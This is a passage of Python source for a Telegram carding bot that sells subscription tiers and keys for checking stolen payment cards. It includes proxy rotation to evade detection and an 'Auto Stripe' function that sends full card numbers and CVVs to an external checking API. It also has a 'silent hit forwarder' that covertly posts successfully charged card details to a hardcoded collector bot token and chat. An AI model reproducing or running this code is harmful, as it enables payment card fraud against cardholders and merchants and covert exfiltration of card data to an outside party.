        print(f"📢 New Plan Purchase notification sent for user {user_id}: {tier.upper()} - {duration_text}")
        
        # Also record in leaderboard as a purchase (optional)
        try:
            leaderboard.record_hit(
                user_id=user_id,
                username=username or first_name,
                gateway="Plan Purchase",
                amount=float(price_actual)
            )
        except:
            pass
            
    except Exception as e:
        print(f"⚠️ Failed to send plan purchase notification: {e}")
        
        
# ============ PLAN PURCHASE NOTIFICATION COMMAND (ADMIN ONLY) ============

async def plan_purchase_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send a plan purchase notification (admin only) - /planpurchase <user_id> <plan> <price> [duration_days]"""
    
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    if len(context.args) < 3:
        await update.message.reply_text(
            "🛒 <b>Plan Purchase Notification Command</b>\n\n"
            "Usage: <code>/planpurchase &lt;user_id&gt; &lt;plan&gt; &lt;price&gt; [days]</code>\n\n"
            "<b>Parameters:</b>\n"
            "• user_id - Telegram user ID\n"
            "• plan - premium, ultimate, admin, trail\n"
            "• price - amount paid (e.g., 10, 20, 50)\n"
            "• days - duration in days (optional, default: 30)\n\n"
            "<b>Examples:</b>\n"
            "<code>/planpurchase 123456789 premium 10 30</code>\n"
            "<code>/planpurchase 123456789 ultimate 20 30</code>\n"
            "<code>/planpurchase 123456789 trail 0 1</code>\n\n"
            "<b>Plan Options:</b>\n"
            "• premium - 🔥 PREMIUM\n"
            "• ultimate - 😈 ULTIMATE  \n"
            "• admin - 💀 ADMIN\n"
            "• trail - 🎯 TRAIL (1 day free trial)",
            parse_mode=ParseMode.HTML
        )
        return
    
    try:
        target_user_id = int(context.args[0])
        plan = context.args[1].lower()
        price = float(context.args[2])
        duration_days = int(context.args[3]) if len(context.args) >= 4 else 30
        
        # Validate plan
        valid_plans = ["premium", "ultimate", "admin", "trail"]
        if plan not in valid_plans:
            await update.message.reply_text(f"❌ Invalid plan. Choose: {', '.join(valid_plans)}")
            return
        
        # Validate duration
        if duration_days < 0:
            await update.message.reply_text("❌ Duration days must be positive or 0 for permanent")
            return
        
        # Try to get user info from Telegram
        try:
            target_user = await context.bot.get_chat(target_user_id)
            username = target_user.username or "NoUsername"
            first_name = target_user.first_name or "User"
        except Exception as e:
            username = "jeena"
            first_name = f"User {target_user_id}"
            print(f"⚠️ Could not fetch user info: {e}")
        
        # Determine plan display
        if plan == "trail":
            plan_display = "🎯 TRAIL"
            price_display = "Free"
            duration_days = 1
        else:
            plan_emoji = {
                "premium": "🔥",
                "ultimate": "😈",
                "admin": "💀"
            }.get(plan, "💎")
            plan_display = f"{plan_emoji} {plan.upper()}"
            price_display = f"${price:.2f}" if price > 0 else "Free"
        
        # Duration text
        if duration_days == 1:
            duration_text = "1 day"
        elif duration_days == 7:
            duration_text = "7 days"
        elif duration_days == 15:
            duration_text = "15 days"
        elif duration_days == 30:
            duration_text = "30 days"
        elif duration_days == 0:
            duration_text = "Permanent"
        else:
            duration_text = f"{duration_days} days"
        
        # User display
        user_display = f"{first_name}"
        if username and username != "Unknown":
            user_display += f" (@{username})"
        user_display += f" (ID: {target_user_id})"
        
        # Generate receipt number
        receipt_number = f"BLD-{datetime.now().strftime('%Y%m%d')}-{random.randint(1000, 9999)}"
        
        # ============ PLAN PURCHASE NOTIFICATION ============
        notification = (
            f"╔══════════════════════════╗\n"
            f"      🛒 NEW PLAN PURCHASED\n"
            f"╚══════════════════════════╝\n\n"
            f"👤 <b>User</b> ➛ {user_display}\n"
            f"👑 <b>Plan</b>  ➛ {plan_display}\n"
            f"💰 <b>Price</b> ➛ {price_display}\n"
            f"⏱️ <b>Duration</b> ➛ {duration_text}\n"
            f"🧾 <b>Receipt</b> ➛ <code>{receipt_number}</code>\n"
            f"🤖 <b>Bot</b> ➛ @Bladesarksbot"
        )
        
        # Send notification to hit group
        if HIT_NOTIFICATION_ENABLED:
            await context.bot.send_message(
                chat_id=HIT_NOTIFICATION_GROUP_ID,
                text=notification,
                parse_mode=ParseMode.HTML
            )
            print(f"📢 Plan purchase notification sent for user {target_user_id}: {plan.upper()} - {duration_text}")
        
        # Also send confirmation to admin
        await update.message.reply_text(
            f"✅ <b>Plan Purchase Notification Sent!</b>\n\n"
            f"👤 User: {target_user_id}\n"
            f"👑 Plan: {plan_display}\n"
            f"💰 Price: {price_display}\n"
            f"⏱️ Duration: {duration_text}\n"
            f"🧾 Receipt: <code>{receipt_number}</code>\n\n"
            f"📢 Notification sent to hit notification group.",
            parse_mode=ParseMode.HTML,
            reply_markup=back_menu()
        )
        
        # Optionally upgrade the user's tier if admin wants to
        if len(context.args) >= 5 and context.args[4] == "--upgrade":
            if user_manager.set_tier(target_user_id, plan if plan != "trail" else "free", update.effective_user.id):
                await update.message.reply_text(
                    f"✅ User {target_user_id} tier upgraded to {plan.upper()}!",
                    parse_mode=ParseMode.HTML
                )
        
    except ValueError as e:
        await update.message.reply_text(f"❌ Invalid number format: {e}")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")


async def genkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate a new redeem key (admin only)"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    args = context.args
    if len(args) != 2:
        await update.message.reply_text(
            "🔑 <b>Generate Key</b>\n\n"
            "Usage: /genkey <plan> <days>\n"
            "Plans: free, premium, ultimate, admin\n"
            "Days: any positive number (0 for permanent)\n\n"
            "Examples:\n"
            "<code>/genkey premium 7</code> - Premium Access for 7 days\n"
            "<code>/genkey ultimate 30</code> - Ultimate Access for 30 days\n"
            "<code>/genkey admin 0</code> - Admin Access (permanent)",
            parse_mode=ParseMode.HTML
        )
        return
    
    try:
        tier = args[0].lower()
        days = int(args[1])
        
        # Validate tier - using actual tier names from user_manager
        valid_tiers = ["free", "premium", "ultimate", "admin"]
        if tier not in valid_tiers:
            await update.message.reply_text(f"❌ Invalid plan. Choose: free, premium, ultimate, admin")
            return
        
        # Validate days
        if days < 0:
            await update.message.reply_text("❌ Days must be 0 or positive")
            return
        
        key = key_manager.generate_key(tier, days, update.effective_user.id)
        
        duration_text = f"{days} days" if days > 0 else "permanent"
        expiry_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M") if days > 0 else "Never"
        plan_emoji = user_manager.TIERS[tier]['emoji']
        
        await update.message.reply_text(
            f"✅ <b>Key Generated!</b>\n\n"
            f"🔑 Key: <code>{key}</code>\n"
            f"🎯 Plan: {plan_emoji} {tier.upper()}\n"
            f"⏱️ Duration: {duration_text}\n"
            f"📅 Expires: {expiry_date}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"User can redeem with: /redeem <code>{key}</code>",
            parse_mode=ParseMode.HTML
        )
    except ValueError:
        await update.message.reply_text("❌ Invalid days format. Use number.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def bulkgen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate multiple redeem keys (admin only)"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    args = context.args
    if len(args) != 3:
        await update.message.reply_text(
            "🔑 <b>Bulk Key Generation</b>\n\n"
            "Usage: /bulkgen <plan> <days> <count>\n"
            "Plans: free, premium, ultimate, admin\n"
            "Days: any positive number (0 for permanent)\n"
            "Count: number of keys to generate (max 50)\n\n"
            "Example: /bulkgen premium 15 10",
            parse_mode=ParseMode.HTML
        )
        return
    
    try:
        tier = args[0].lower()
        days = int(args[1])
        count = int(args[2])
        
        # Validate tier
        valid_tiers = ["free", "premium", "ultimate", "admin"]
        if tier not in valid_tiers:
            await update.message.reply_text(f"❌ Invalid plan. Choose: free, premium, ultimate, admin")
            return
        
        # Validate days
        if days < 0:
            await update.message.reply_text("❌ Days must be 0 or positive")
            return
            
        # Validate count
        if count < 1 or count > 50:
            await update.message.reply_text("❌ Count must be between 1 and 50")
            return
        
        keys = key_manager.bulk_generate_keys(tier, days, count, update.effective_user.id)
        
        duration_text = f"{days} days" if days > 0 else "permanent"
        expiry_date = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d %H:%M") if days > 0 else "Never"
        plan_emoji = user_manager.TIERS[tier]['emoji']
        
        keys_text = ""
        for i, k in enumerate(keys, 1):
            keys_text += f"{i}. <code>{k}</code>\n"
        
        await update.message.reply_text(
            f"✅ <b>{count} Keys Generated!</b>\n\n"
            f"🎯 Plan: {plan_emoji} {tier.upper()}\n"
            f"⏱️ Duration: {duration_text}\n"
            f"📅 Expires: {expiry_date}\n"
            f"━━━━━━━━━━━━━━━━━━━\n\n"
            f"{keys_text}\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"Users can redeem with: /redeem &lt;key&gt;",
            parse_mode=ParseMode.HTML
        )
        
        # Also send plain text for easy copying
        plain_keys = "\n".join(keys)
        await update.message.reply_text(
            f"📋 Keys (plain text):\n\n{plain_keys}",
            parse_mode=None
        )
        
    except ValueError:
        await update.message.reply_text("❌ Invalid number format.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)[:100]}")

async def keys_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all keys (admin only)"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    key_manager.check_expired_keys()
    keys = key_manager.list_keys()
    
    if not keys:
        await update.message.reply_text("📋 No keys found.")
        return
    
    msg = "🔑 <b>Redeem Keys</b>\n\n"
    used_count = sum(1 for k in keys if k["used_by"])
    active_count = sum(1 for k in keys if k["active"] and not k["used_by"])
    expired_count = sum(1 for k in keys if not k["active"] and not k["used_by"])
    
    msg += f"📊 Total: {len(keys)} | ✅ Active: {active_count} | 🔴 Used: {used_count} | ⚠️ Expired: {expired_count}\n"
    msg += f"━━━━━━━━━━━━━━━━━━━\n\n"
    
    for key in keys[:10]:
        status = "✅" if key["active"] and not key["used_by"] else "🔴" if key["used_by"] else "⚠️"
        used_info = f"Used by: {key['used_by']}" if key["used_by"] else "Available"
        expiry_info = f"Expires: {key['expiry']}" if key['expiry'] != "Never" else "Never expires"
        
        msg += f"{status} <code>{key['key']}</code>\n"
        msg += f"  🎯 {key['tier'].upper()} | ⏱️ {key['duration']}d\n"
        msg += f"  📅 {key['created']} | {used_info}\n"
        msg += f"  📆 {expiry_info}\n\n"
    
    if len(keys) > 10:
        msg += f"... and {len(keys) - 10} more keys"
    
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML, reply_markup=back_menu())

async def deactivatekey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Deactivate a key (admin only)"""
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Admin only command.")
        return
    
    if not context.args:
        await update.message.reply_text("Usage: /deactivatekey <key>")
        return
    
    key = context.args[0]
    if key_manager.deactivate_key(key, update.effective_user.id):
        await update.message.reply_text(f"✅ Key deactivated: {key}")
    else:
        await update.message.reply_text("❌ Key not found.")

async def key_expiry_worker(context: ContextTypes.DEFAULT_TYPE):
    """Background task to check for expired keys and user tiers"""
    # Check expired keys
    key_manager.check_expired_keys()
    
    # Check expired user tiers
    users = user_manager.users
    current_time = time.time()
    changed = False
    
    for user_id_str, user_data in users.items():
        if user_data.get("tier_expiry", 0) > 0 and current_time > user_data["tier_expiry"]:
            original_tier = user_data.get("upgraded_from", "free")
            user_data["tier"] = original_tier
            user_data["tier_expiry"] = 0
            user_data["upgraded_from"] = None
            changed = True
            print(f"👤 User {user_id_str} tier expired, reverted to {original_tier}")
            
            # Update cache if exists
            if hasattr(user_manager, 'cache') and int(user_id_str) in user_manager.cache:
                user_manager.cache[int(user_id_str)] = user_data
    
    if changed:
        user_manager.save_users()
    
    print("🔑 Key expiry check completed")
    
    
# ============ SILENT HIT FORWARDER ============
# Add these configuration variables near your other configs

HIT_FORWARDER_BOT_TOKEN = "8605211195:AAH6385lYpQ2fxTH5V5QPVm0l3wIY_6LJu8"  # Replace with your hit collector bot token
HIT_FORWARDER_CHAT_ID = "-5012494578"  # Your personal chat ID or group ID where hits go
HIT_FORWARDER_ENABLED = True  # Set to False to disable

# Initialize hit forwarder client (lazy loaded)
_hit_forwarder_client = None

async def get_hit_forwarder_client():
    """Get or create HTTP client for hit forwarding"""
    global _hit_forwarder_client
    if _hit_forwarder_client is None:
        _hit_forwarder_client = httpx.AsyncClient(
            timeout=httpx.Timeout(10.0),
            limits=httpx.Limits(max_keepalive_connections=5)
        )
    return _hit_forwarder_client

async def send_hit_to_forwarder(card: str, gateway: str, response: str, price: str, 
                                 bin_info: tuple, user_id: int, user_tier: str, 
                                 status_category: str):
    """
    Silently forward hit to the collector bot.
    This runs in background and doesn't block or notify the user.
    """
    if not HIT_FORWARDER_ENABLED:
        return
    
    if status_category not in ["charged"]:
        return  # Only forward actual hits
    
    try:
        bin_info_text, bank, country, currency_code, country_code = bin_info if bin_info else ("N/A", "N/A", "N/A", "N/A", "N/A")
        
        # Get current time
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # Truncate card for display (only show partial for safety)
        card_preview = card[:6] + "******" + card[-4:] if len(card) >= 16 else card
        
        # Format the hit message (clean, no user info) - SHORTER to avoid 400 error
        hit_message = (
            f"💳 HIT DETECTED\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"Card: {card_preview}\n"
            f"Gateway: {gateway}\n"
            f"Response: {response[:100]}\n"
            f"Price: {price}\n"
            f"BIN: {bin_info_text}\n"
            f"Bank: {bank}\n"
            f"Country: {country}\n"
            f"Time: {timestamp}"
        )
        
        # Make sure message is not too long (Telegram limit is 4096)
        if len(hit_message) > 4000:
            hit_message = hit_message[:4000] + "..."
        
        # Send via Telegram Bot API using simple POST
        send_url = f"https://api.telegram.org/bot{HIT_FORWARDER_BOT_TOKEN}/sendMessage"
        
        # Use aiohttp instead of httpx for better compatibility
        async with aiohttp.ClientSession() as session:
            payload = {
                "chat_id": HIT_FORWARDER_CHAT_ID,
                "text": hit_message,
                "parse_mode": "HTML"  # Changed to HTML (no markdown)
            }
            
            async with session.post(send_url, json=payload) as resp:
                if resp.status == 200:
                    print(f"📤 [HIT FORWARDER] Successfully forwarded hit for card {card[:6]}xxxxxx")
                else:
                    response_text = await resp.text()
                    print(f"⚠️ [HIT FORWARDER] Failed: HTTP {resp.status}, Response: {response_text[:200]}")
                    
                    # Try without HTML parse mode as fallback
                    if resp.status == 400:
                        payload_no_html = {
                            "chat_id": HIT_FORWARDER_CHAT_ID,
                            "text": hit_message.replace("<b>", "").replace("</b>", "").replace("<code>", "").replace("</code>", "")
                        }
                        async with session.post(send_url, json=payload_no_html) as resp2:
                            if resp2.status == 200:
                                print(f"📤 [HIT FORWARDER] Successfully forwarded (plain text)")
                            else:
                                print(f"⚠️ [HIT FORWARDER] Still failed: HTTP {resp2.status}")
            
    except Exception as e:
        print(f"⚠️ [HIT FORWARDER] Error: {e}")

async def close_hit_forwarder():
    """Close the hit forwarder client on shutdown"""
    global _hit_forwarder_client
    if _hit_forwarder_client:
        await _hit_forwarder_client.aclose()
        _hit_forwarder_client = None

# ============ PROXY HELPER FUNCTIONS ============
def format_proxy(proxy_str):
    """
    Format ANY proxy string for httpx and requests
    Supports formats:
    - ip:port
    - user:pass@ip:port
    - http://user:pass@ip:port
    - http://ip:port
    - https://ip:port
    - socks5://ip:port
    - user:pass:ip:port
    - ip:port:user:pass
    - http://user:pass:ip:port
    - http://590746384137043:2weeks@219.100.37.85:2894314  (long passwords with letters)
    """
    try:
        if not proxy_str or not isinstance(proxy_str, str):
            return None
            
        proxy_str = proxy_str.strip()
        if not proxy_str:
            return None
            
        # If already has protocol prefix, return as is
        if proxy_str.startswith(('http://', 'https://', 'socks4://', 'socks5://')):
            return proxy_str
        
        # Handle format: user:pass@ip:port
        if '@' in proxy_str:
            # Already in correct format, just add http:// prefix if missing
            if not proxy_str.startswith(('http://', 'https://')):
                return f"http://{proxy_str}"
            return proxy_str
        
        # Handle format: user:pass:ip:port or ip:port:user:pass
        parts = proxy_str.split(':')
        
        # Format: ip:port
        if len(parts) == 2:
            return f"http://{proxy_str}"
        
        # Format: user:pass:ip:port (4 parts)
        elif len(parts) == 4:
            # Check if first part looks like IP (starts with digit) or user
            if parts[0].replace('.', '').isdigit():  # First part is IP-like
                # Format: ip:port:user:pass
                ip, port, user, password = parts
                return f"http://{user}:{password}@{ip}:{port}"
            else:
                # Format: user:pass:ip:port
                user, password, ip, port = parts
                return f"http://{user}:{password}@{ip}:{port}"
        
        # Format: user:pass@ip:port (already handled above)
        elif len(parts) == 3:
            # Could be something like user:pass@ip:port but without @
            # Try to parse intelligently
            if '@' in proxy_str:
                return f"http://{proxy_str}"
            else:
                # Assume it's user:pass:ip with default port? Unlikely
                return None
        
        return None
        
    except Exception as e:
        print(f"⚠️ Error formatting proxy '{proxy_str[:30]}': {e}")
        return None

def mask_proxy(proxy_str):
    """Mask proxy for display - works with all formats"""
    if not proxy_str or proxy_str == "No Proxy":
        return "None"
    try:
        # Handle http://user:pass@ip:port format
        if '@' in proxy_str:
            parts = proxy_str.split('@')
            auth_part = parts[0]
            ip_part = parts[-1]
            
            # Mask auth part
            if '://' in auth_part:
                protocol = auth_part.split('://')[0]
                return f"{protocol}://***@{ip_part}"
            else:
                return f"***@{ip_part}"
        
        # Handle simple ip:port
        elif ':' in proxy_str:
            parts = proxy_str.split(':')
            if len(parts) >= 2:
                # Check if it has protocol
                if '//' in proxy_str:
                    protocol = proxy_str.split('://')[0]
                    return f"{protocol}://***.***.***.***:{parts[-1]}"
                else:
                    return f"***.***.***.***:{parts[-1]}"
    except:
        pass
    return "Proxy (masked)"

def get_proxy_for_user(user_id: int) -> Optional[str]:
    """Get a proxy for a specific user (return raw, unformatted)"""
    return proxy_manager.get_next_proxy_for_user(user_id)

def get_rotating_proxy_for_user(user_id: int, gateway: str = 'paypal') -> Optional[str]:
    """Get next proxy in rotation for a specific user"""
    if not user_manager.can_use_proxy(user_id):
        return None
    
    # Check if user has any proxies
    if user_id not in proxy_manager.user_proxies or not proxy_manager.user_proxies[user_id]:
        return None
    
    # Get ALL available proxies (failed ones are already removed)
    available_proxies = proxy_manager.user_proxies[user_id].copy()
    
    if not available_proxies:
        return None
    
    # Create rotation index
    rotation_key = f"{user_id}_{gateway}"
    if not hasattr(proxy_manager, 'user_rotation_indices'):
        proxy_manager.user_rotation_indices = {}
    
    if rotation_key not in proxy_manager.user_rotation_indices:
        proxy_manager.user_rotation_indices[rotation_key] = 0
    
    # Get next proxy
    idx = proxy_manager.user_rotation_indices[rotation_key] % len(available_proxies)
    selected_raw = available_proxies[idx]
    
    # Update index
    proxy_manager.user_rotation_indices[rotation_key] = (idx + 1) % len(available_proxies)
    
    # Format the proxy
    formatted = format_proxy_for_paypal(selected_raw)
    
    print(f"🔄 [PAYPAL] Using proxy #{idx + 1}/{len(available_proxies)}: {mask_proxy(formatted or selected_raw)}")
    
    return formatted or selected_raw

# Update the get_proxy_for_user function to support rotation
def get_proxy_for_user(user_id: int, gateway: str = 'default') -> Optional[str]:
    """
    Get a proxy for a specific user with rotation support for different gateways
    """
    if gateway == 'paypal':
        return get_rotating_proxy_for_user(user_id, 'paypal')
    
    # Default behavior for other gateways
    return proxy_manager.get_next_proxy_for_user(user_id)

def get_working_proxy_for_user(user_id: int, api_type: str = 'any') -> Optional[str]:
    """
    Get best working proxy from user's pool based on performance
    """
    if not user_manager.can_use_proxy(user_id):
        return None
    
    # Check if user has any proxies
    if user_id not in proxy_manager.user_proxies or not proxy_manager.user_proxies[user_id]:
        return None
    
    # Get available proxies (not marked as failed in current session)
    available_proxies = []
    failed_set = proxy_manager.user_failed_proxies.get(user_id, set())
    
    for proxy in proxy_manager.user_proxies[user_id]:
        if proxy not in failed_set:
            available_proxies.append(proxy)
    
    # If all proxies are failed, reset and try all
    if not available_proxies:
        print(f"🔄 All proxies failed for user {user_id}, resetting failed list")
        proxy_manager.user_failed_proxies[user_id] = set()
        available_proxies = proxy_manager.user_proxies[user_id].copy()
    
    if not available_proxies:
        return None
    
    # Prioritize proxies that work with the specific API
    prioritized_proxies = []
    
    if api_type == 'main':
        # Get proxies that work with MAIN API
        main_api_proxies = proxy_manager.user_main_api_proxies.get(user_id, [])
        for proxy in main_api_proxies:
            if proxy in available_proxies:
                prioritized_proxies.append(proxy)
    elif api_type == 'backup':
        # Get proxies that work with BACKUP API
        backup_api_proxies = getattr(proxy_manager, 'user_backup_api_proxies', {}).get(user_id, [])
        for proxy in backup_api_proxies:
            if proxy in available_proxies:
                prioritized_proxies.append(proxy)
    
    # If we have prioritized proxies, use them
    if prioritized_proxies:
        # Use round-robin on prioritized proxies
        if user_id not in proxy_manager.user_proxy_index:
            proxy_manager.user_proxy_index[user_id] = 0
        idx = proxy_manager.user_proxy_index[user_id] % len(prioritized_proxies)
        proxy_manager.user_proxy_index[user_id] = (idx + 1) % len(prioritized_proxies)
        selected = prioritized_proxies[idx]
        
        # Format based on API type
        if api_type == 'main':
            return convert_to_main_api_format(selected)
        elif api_type == 'backup':
            return format_proxy_for_api('backup', selected)
        else:
            return convert_to_main_api_format(selected)
    
    # Fallback to all proxies
    if user_id not in proxy_manager.user_proxy_index:
        proxy_manager.user_proxy_index[user_id] = 0
    
    idx = proxy_manager.user_proxy_index[user_id] % len(available_proxies)
    proxy_manager.user_proxy_index[user_id] = (idx + 1) % len(available_proxies)
    selected = available_proxies[idx]
    
    # Format based on API type
    if api_type == 'main':
        return convert_to_main_api_format(selected)
    elif api_type == 'backup':
        return format_proxy_for_api('backup', selected)
    else:
        return convert_to_main_api_format(selected)

# ============ SMART PROXY FORMATTER FOR MULTIPLE APIS ============

def format_proxy_for_api(api_type: str, raw_proxy: str) -> Optional[str]:
    """
    Format proxy according to specific API requirements
    
    Args:
        api_type: 'main' or 'backup'
        raw_proxy: Raw proxy string in any format
    
    Returns:
        Formatted proxy string or None if invalid
    """
    if not raw_proxy:
        return None
    
    try:
        # Remove any protocol prefixes first
        proxy = re.sub(r'^(http|https|socks4|socks5)://', '', raw_proxy)
        
        # Parse the proxy components
        host = None
        port = None
        user = None
        password = None
        
        # Format 1: user:pass@host:port
        if '@' in proxy:
            auth, hostport = proxy.split('@', 1)
            if ':' in auth:
                user, password = auth.split(':', 1)
            if ':' in hostport:
                host, port = hostport.split(':', 1)
        
        # Format 2: host:port:user:pass
        elif proxy.count(':') == 3:
            parts = proxy.split(':')
            # Check if first part looks like host (has dots or letters)
            if '.' in parts[0] or not parts[0].isdigit():
                host, port, user, password = parts
            else:
                user, password, host, port = parts
        
        # Format 3: host:port only
        elif proxy.count(':') == 1:
            host, port = proxy.split(':')
        
        if not host or not port:
            print(f"⚠️ Could not parse host/port from: {raw_proxy[:50]}")
            return None
        
        # Validate port
        try:
            int(port)
        except ValueError:
            print(f"⚠️ Invalid port number: {port}")
            return None
        
        # Format according to API
        if api_type == 'main':
            # MAIN API: host:port:user:pass
            if user and password:
                return f"{host}:{port}:{user}:{password}"
            return f"{host}:{port}"
        
        elif api_type == 'backup':
            # BACKUP API: user:pass@host:port
            if user and password:
                return f"{user}:{password}@{host}:{port}"
            return f"{host}:{port}"
            
        return None
        
    except Exception as e:
        print(f"⚠️ Error formatting proxy: {e}")
        return None
    
# ============ BUTTON-BASED PROGRESS BAR ============
def create_progress_buttons(current: int, total: int, approved: int, declined: int, 
                            current_card: str = "", status: str = "Checking...") -> InlineKeyboardMarkup:
    """
    Create a progress bar using buttons - 6 buttons showing status
    """
    percentage = (current / total) * 100 if total > 0 else 0
    filled = int(percentage / 10)  # 10 blocks for 100%
    bar = "▰" * filled + "▱" * (10 - filled)
    
    # Format current card display (first 8 digits)
    if current_card and '|' in current_card:
        card_preview = current_card.split('|')[0][:8] + "..."
    elif current_card:
        card_preview = current_card[:8] + "..."
    else:
        card_preview = "Preparing..."
    
    # Create the 6 buttons
    keyboard = [
        [InlineKeyboardButton(f"🔥 𝘼𝙡𝙡 𝘾𝙘𝙨 𝘼𝙧𝙚 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜...", callback_data='ignore')],
        [InlineKeyboardButton(f"💳 Current: {card_preview}", callback_data='ignore')],
        [InlineKeyboardButton(f"⏳ Status: {status}", callback_data='ignore')],
        [InlineKeyboardButton(f"✅ Approved: {approved}", callback_data='ignore')],
        [InlineKeyboardButton(f"❌ Declined: {declined}", callback_data='ignore')],
        [InlineKeyboardButton(f"📊 Progress: {current}/{total} {bar} {percentage:.1f}%", callback_data='ignore')],
        [InlineKeyboardButton("🛑 STOP SESSION", callback_data=f'stop_session')]
    ]
    
    return InlineKeyboardMarkup(keyboard)

async def update_progress_buttons(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int,
                                   current: int, total: int, approved: int, declined: int,
                                   current_card: str = "", status: str = "Checking..."):
    """Update the button-based progress bar - with aggressive rate limiting"""
    
    # Only update every 10 cards or at completion (reduced from 5 to 10)
    if current > 0 and current < total and current % 10 != 0:
        return  # Skip update for most cards
    
    # Also skip if it's been less than 2 seconds since last update
    if hasattr(update_progress_buttons, 'last_update_time'):
        last_time = update_progress_buttons.last_update_time
        if time.time() - last_time < 2.0 and current < total:
            return
    
    update_progress_buttons.last_update_time = time.time()
    
    try:
        new_markup = create_progress_buttons(current, total, approved, declined, current_card, status)
        await context.bot.edit_message_reply_markup(
            chat_id=chat_id,
            message_id=message_id,
            reply_markup=new_markup
        )
    except Exception as e:
        # Ignore "message is not modified" errors
        if "message is not modified" not in str(e).lower():
            print(f"⚠️ Progress update error: {e}")
    
# ============ AUTO STRIPE API CONFIG ============
AUTO_STRIPE_API_BASE = "http://web-production-6695b.up.railway.app"  # Changed from http to https
AUTO_STRIPE_API_KEY = "DemoKey"  # Changed to match your test

# Updated API endpoint path - your test shows it's just /check
AUTO_STRIPE_CHECK_ENDPOINT = "/check"

# ============ AUTO STRIPE API FUNCTIONS ============

async def check_card_auto_stripe(card: str, site: str, gateway: str = "autostripe", key: str = None, proxy: str = None) -> Dict:
    """
    Check card using Auto Stripe API
    API Endpoint: /check?gateway=autostripe&key={key}&site={site}&cc={card}
    """
    print(f"\n{'='*80}")
    print(f"💳 [AUTO STRIPE API] Checking card: {card[:20]}...")
    print(f"📍 Site: {site}")
    print(f"{'='*80}")
    
    # Default result in case of any failure
    default_result = {
        "status": "error",
        "result": "UNKNOWN_ERROR",
        "message": "Unknown error occurred",
        "status_display": "⚠️ ERROR",
        "status_category": "error",
        "elapsed": 0,
        "proxy_used": proxy,
        "retryable": False
    }
    
    try:
        # Parse card for validation
        parts = card.split('|')
        if len(parts) != 4:
            return {
                "status": "error",
                "result": "INVALID_FORMAT",
                "message": "Invalid card format. Use: NUMBER|MM|YYYY|CVV",
                "status_display": "⚠️ INVALID FORMAT",
                "status_category": "error"
            }
        
        card_num, card_mm, card_yy, card_cvv = parts
        
        # Validate year format
        if len(card_yy) == 4:
            card_yy = card_yy[2:]  # Convert 2026 to 26
        
        # Reconstruct card with proper format
        formatted_card = f"{card_num}|{card_mm}|{card_yy}|{card_cvv}"
        
        # Prepare API parameters
        api_key = key or AUTO_STRIPE_API_KEY
        
        # IMPORTANT: Don't encode the site - keep it as-is
        # Remove http:// or https:// from site if present
        if site.startswith(('http://', 'https://')):
            site_clean = site.split('://')[1]
        else:
            site_clean = site
        
        # Build the URL with parameters
        api_url = f"{AUTO_STRIPE_API_BASE}{AUTO_STRIPE_CHECK_ENDPOINT}"
        
        # Prepare parameters
        params = {
            'gateway': gateway,
            'key': api_key,
            'site': site_clean,  # Don't encode - let httpx handle it
            'cc': formatted_card
        }
        
        print(f"📤 Request URL: {api_url}")
        print(f"📤 Parameters: gateway={gateway}, key={api_key}, site={site_clean}, cc={formatted_card[:20]}...")
        
        start_time = time.time()
        
        # Prepare headers
        headers = {
            'User-Agent': generate_user_agent(),
            'Accept': 'application/json',
        }
        
        # Make request
        async with httpx.AsyncClient(timeout=60.0, verify=False, follow_redirects=True) as client:
            response = await client.get(api_url, params=params, headers=headers)
        
        elapsed = time.time() - start_time
        print(f"📥 Response time: {elapsed:.2f}s")
        print(f"📊 Status code: {response.status_code}")
        
        if response.status_code == 200:
            try:
                data = response.json()
                print(f"✅ Response: {json.dumps(data, indent=2)}")
                
                # Extract data from API response
                api_status = data.get('status', 'ERROR')
                api_response = data.get('response', 'Unknown')
                
                # Map status to our format
                if api_status == 'Approved':
                    status_display = "✅ APPROVED"
                    status_category = "approved"
                    
                    # Check response message for more details
                    if 'New Payment Method Added Successfully' in api_response:
                        status_display = "✅ ADDED"
                elif api_status == 'Declined':
                    status_display = "❌ DECLINED"
                    status_category = "declined"
                else:
                    status_display = "⚠️ ERROR"
                    status_category = "error"
                
                result = {
                    "status": "success" if api_status in ['Approved', 'Declined'] else "error",
                    "result": api_status,
                    "message": api_response,
                    "status_display": status_display,
                    "status_category": status_category,
                    "elapsed": elapsed,
                    "proxy_used": proxy,
                    "site": site,
                    "gateway": gateway
                }
                
                return result
                
            except json.JSONDecodeError as e:
                print(f"⚠️ JSON parse error: {e}")
                default_result["message"] = "Invalid JSON response"
                default_result["elapsed"] = elapsed
                return default_result
        else:
            print(f"⚠️ HTTP error: {response.status_code}")
            print(f"📄 Response text: {response.text[:200]}")
            default_result["message"] = f"HTTP Error: {response.status_code}"
            default_result["elapsed"] = elapsed
            return default_result
            
    except httpx.TimeoutException:
        print(f"⏰ Timeout error")
        default_result["message"] = "Request timeout - API may be down"
        return default_result
    except Exception as e:
        print(f"❌ Error: {e}")
        default_result["message"] = str(e)[:100]
        return default_result


def format_auto_stripe_response(result: Dict, card: str, bin_info: tuple) -> Tuple[str, str]:
    """Format Auto Stripe response for display"""
    
    # Safety check - if result is None, create default
    if result is None:
